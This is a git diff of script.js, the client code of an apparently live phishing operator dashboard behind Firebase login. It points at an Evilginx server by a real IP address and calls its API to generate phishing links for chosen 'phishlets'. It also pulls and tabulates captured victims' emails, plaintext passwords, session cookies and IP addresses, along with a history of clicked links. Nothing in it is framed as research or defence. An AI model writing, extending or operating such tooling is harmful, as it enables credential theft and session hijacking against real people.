@@ -1,17 +1,17 @@
 console.log("✅ script.js loaded successfully");
 
-// Set your Evilginx server (use your domain if available)
-const EVILGINX_SERVER = "http://tecan.com.co:5000";  // UPDATE this with your actual Evilginx domain/IP
+// Set your Evilginx server (update with your actual domain or IP and port)
+const EVILGINX_SERVER = "http://3.149.242.245:5000";
 
-// Ensure Firebase is loaded before executing functions
-document.addEventListener("DOMContentLoaded", function () {
+// Wait for Firebase to load before running any functions
+document.addEventListener("DOMContentLoaded", () => {
   if (typeof firebase === "undefined") {
     console.error("❌ Firebase is NOT defined. Check firebase-config.js.");
     return;
   }
   checkAuthStatus();
   
-  // (Optional) Attach event listener to login button if not already attached inline
+  // Attach login event if not already attached
   const loginBtn = document.getElementById("loginBtn");
   if (loginBtn) {
     loginBtn.addEventListener("click", login);
@@ -20,15 +20,17 @@ document.addEventListener("DOMContentLoaded", function () {
 
 // Check Authentication Status and Redirect Accordingly
 function checkAuthStatus() {
-  firebase.auth().onAuthStateChanged(function (user) {
+  firebase.auth().onAuthStateChanged(user => {
     if (user) {
       console.log("✅ User logged in:", user.email);
+      // If on login page and user is already logged in, redirect to dashboard
       if (window.location.pathname.endsWith("index.html") || window.location.pathname === "/") {
         window.location.href = "dashboard.html";
       }
     } else {
       console.log("❌ User not logged in.");
-      if (window.location.pathname.endsWith("dashboard.html")) {
+      // If on dashboard pages and not logged in, redirect to login
+      if (window.location.pathname.endsWith("dashboard.html") || window.location.pathname.endsWith("dashboard2.html")) {
         window.location.href = "index.html";
       }
     }
@@ -39,18 +41,17 @@ function checkAuthStatus() {
 function login() {
   const email = document.getElementById("email").value;
   const password = document.getElementById("password").value;
-
   if (!email || !password) {
     alert("Please enter email and password.");
     return;
   }
-
+  
   firebase.auth().signInWithEmailAndPassword(email, password)
-    .then(function (userCredential) {
+    .then(userCredential => {
       console.log("✅ Login successful:", userCredential.user.email);
       window.location.href = "dashboard.html";
     })
-    .catch(function (error) {
+    .catch(error => {
       console.error("❌ Login failed:", error.message);
       document.getElementById("loginError").innerText = error.message;
     });
@@ -58,34 +59,24 @@ function login() {
 
 // Logout Function
 function logout() {
-  firebase.auth().signOut().then(function () {
+  firebase.auth().signOut().then(() => {
     console.log("✅ User logged out.");
     window.location.href = "index.html";
-  }).catch(function (error) {
+  }).catch(error => {
     console.error("❌ Logout failed:", error.message);
   });
 }
 
-// Evilginx API Integration Functions
+// --------------------- Evilginx API Integration ---------------------
 
-// Generate Evilginx Phishing Link for Selected Phishlet
+// Generate a generic Evilginx phishing link (if no phishlet specified)
 function generateLink() {
-  // Get selected phishlet from dropdown (if present)
-  const phishletSelect = document.getElementById("phishletSelect");
-  const phishlet = phishletSelect ? phishletSelect.value : "";
-  
-  // Append phishlet as query parameter if provided
-  let url = `${EVILGINX_SERVER}/generate_link`;
-  if (phishlet) {
-    url += `?phishlet=${encodeURIComponent(phishlet)}`;
-  }
-  
-  fetch(url)
+  fetch(`${EVILGINX_SERVER}/generate_link`)
     .then(response => response.json())
     .then(data => {
       if (data.link) {
         console.log("✅ Link generated:", data.link);
-        document.getElementById("generatedLink").innerHTML = `Generated Link: <a href="${data.link}" target="_blank">${data.link}</a>`;
+        alert("Phishing Link: " + data.link);
       } else {
         console.error("❌ Failed to generate link:", data);
         alert("Failed to generate link.");
@@ -97,20 +88,41 @@ function generateLink() {
     });
 }
 
-// Fetch Captured Sessions and populate table
+// Generate a phishing link for a specific phishlet (used in Dashboard2)
+function generatePhishletLink(phishlet) {
+  const url = `${EVILGINX_SERVER}/generate_link?phishlet=${encodeURIComponent(phishlet)}`;
+  fetch(url)
+    .then(response => response.json())
+    .then(data => {
+      if (data.link) {
+        console.log("✅ Generated link for", phishlet, ":", data.link);
+        document.getElementById("phishletLink").innerHTML =
+          `Generated Link for ${phishlet}: <a href="${data.link}" target="_blank">${data.link}</a>`;
+      } else {
+        console.error("❌ Failed to generate link for", phishlet, data);
+        alert("Failed to generate link for " + phishlet);
+      }
+    })
+    .catch(error => {
+      console.error("❌ Error generating phishlet link:", error);
+      alert("Error generating phishlet link for " + phishlet);
+    });
+}
+
+// Fetch and display captured sessions from Evilginx
 function viewCapturedSessions() {
   fetch(`${EVILGINX_SERVER}/captured_sessions`)
     .then(response => response.json())
     .then(data => {
       let tableBody = document.getElementById("capturedSessions");
-      tableBody.innerHTML = "";
-      data.forEach(function(session) {
+      tableBody.innerHTML = ""; // Clear previous data
+      data.forEach(session => {
         let row = `<tr>
-                      <td>${session.email}</td>
-                      <td>${session.password}</td>
-                      <td>${session.cookies}</td>
-                      <td>${session.ip}</td>
-                   </tr>`;
+          <td>${session.email}</td>
+          <td>${session.password}</td>
+          <td>${session.cookies}</td>
+          <td>${session.ip}</td>
+        </tr>`;
         tableBody.innerHTML += row;
       });
       console.log("✅ Captured sessions loaded successfully.");
@@ -121,19 +133,19 @@ function viewCapturedSessions() {
     });
 }
 
-// Fetch Generated Links History and populate table
+// Fetch and display generated links history from Evilginx
 function viewGeneratedLinks() {
   fetch(`${EVILGINX_SERVER}/generated_links`)
     .then(response => response.json())
     .then(data => {
       let tableBody = document.getElementById("generatedLinks");
-      tableBody.innerHTML = "";
-      data.forEach(function(link) {
+      tableBody.innerHTML = ""; // Clear previous data
+      data.forEach(link => {
         let row = `<tr>
-                      <td>${link.url}</td>
-                      <td>${link.clicked_location}</td>
-                      <td>${link.ip}</td>
-                   </tr>`;
+          <td>${link.url}</td>
+          <td>${link.clicked_location}</td>
+          <td>${link.ip}</td>
+        </tr>`;
         tableBody.innerHTML += row;
       });
       console.log("✅ Generated links history loaded successfully.");
@@ -143,3 +155,11 @@ function viewGeneratedLinks() {
       alert("Error fetching generated links history.");
     });
 }
+
+// Optionally, if you want to auto-load data on dashboard page, you can add:
+// document.addEventListener("DOMContentLoaded", () => {
+//   if (window.location.pathname.endsWith("dashboard.html")) {
+//     viewCapturedSessions();
+//     viewGeneratedLinks();
+//   }
+// });
